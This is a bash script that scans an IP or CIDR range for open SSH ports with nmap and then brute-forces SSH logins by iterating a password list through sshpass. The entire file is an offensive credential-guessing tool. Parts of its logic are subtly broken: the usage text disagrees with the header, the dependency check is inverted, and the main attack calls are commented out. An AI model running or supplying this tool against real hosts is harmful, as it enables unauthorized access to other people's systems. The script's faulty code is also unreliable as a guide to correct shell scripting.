#!/bin/bash

#     
#     
#     ./sshBruteForce.sh [user] [file]
#     
#     Attempt to authenticate with [user] while iterating
#     through all the passwords in [file]. Passwords in [file]
#     should be delimted (IFS) with newlines
#     
#     


## Script Variables
USER="${1}"
LIST="${2}"
IP="${3}"
IP_REGEX='(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)'
CIDR_REGEX='(([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\.){3}([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])(\/([0-9]|[1-2][0-9]|3[0-2]))'

user_check(){
	local username
	username="${1}"
	if [[ $(ls ${username} 2> /dev/null) ]]; then
		echo 'Usage: ./sshBruteForce.ssh user password.lst 192.168.1.1'
		exit 26
	fi
}


password_list_check(){
	local password_list_check
	password_list_check="${1}"
	if [[ ${password_list_check:?"### Usage: ./sshBruteForce.ssh user password.lst 192.168.1.1"} ]]; then
		IFS='
		'
		declare -g LIST=( $(cat "${password_list_check}") )
	fi
}

ip_check(){
	local ip
	ip="${1}"
	declare -g IPS=()
	if [[ "${ip}" =~ ${CIDR_REGEX} ]]; then
		echo 'fire the nmap'
		declare -g IPS=( $(nmap -p T:22 "${ip}" | grep -B3 'tcp open' | grep -Eo "${IP_REGEX}") )
	else
		if ! [[ "${ip}" =~ ${IP_REGEX} ]]; then
			echo "${ip} is not a valid IP or CIDR address"
			exit 26
		else
			echo 'adding ip to array'
			IPS+=("${ip}")
		fi
	fi
}


dep_check(){
	declare -a dependencies=("nmap" "ssh" "sshpass")
	for i in "${dependencies[@]}"; do
		if [[ $(dpkg -l "${i}" > /dev/null) ]]; then
			sudo apt-get install "${i}" -y
		fi
	done
}


sshpass_iterations(){
	local username
	username=${1}
	local ip
	ip="${2}"
	for password in ${LIST[@]}; do
		echo "Attempting Username: ${username} Password: ${password}" && sshpass -p "${password}" ssh "${username}"@"${ip}" 2>/dev/null <<<- 'ifconfig | grep -m1 "inet "'
	done
}


user_check "${USER}"
password_list_check "${LIST}"
ip_check "${IP}"

for ip in ${IPS[@]}; do
	echo "${ip}"
done	

#dep_check
#sshpass_iterations "${USER}" "${IP}"
